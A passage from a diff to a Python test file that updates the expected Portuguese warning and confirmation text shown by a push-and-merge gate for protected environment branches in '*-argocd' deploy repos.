         "ATENÇÃO: branch de ambiente main no repo deploy-argocd",
     ]
-    assert "Referências: main" in lines
+    assert "main → origin" in lines
     bare = box("git push", env, cwd=str(repo))
     assert "ATENÇÃO: branch de ambiente main no repo deploy-argocd" in bare
     every = box("git push --all", env, cwd=str(repo))
@@ -2330,7 +2339,7 @@ def test_without_the_environment_list_the_policy_is_off(make_repo, env):
     repo = make_repo("app")
     write_config(env, '[gate]\ndirect_push_repos = ["*-argocd"]\n')
 
-    assert "Branch atual: main" in box("git push", env, cwd=str(repo))
+    assert "main → " in box("git push", env, cwd=str(repo))
     assert box("git push origin master", env, cwd=str(repo))
 
 
@@ -2533,7 +2542,7 @@ def test_a_pr_merge_into_another_branch_asks_with_its_base(env, tmp_path):
     gh_env, _ = fake_gh(tmp_path, env, BASE_ANSWERS)
     lines = box("gh pr merge 8 -R o/app", gh_env).splitlines()
 
-    assert lines[1:3] == ["Mesclar o PR 8 em o/app", "Base: feature/base"]
+    assert lines[:2] == ["Mescla o PR 8 em o/app", "Base: feature/base"]
 
 
 @pytest.mark.parametrize(
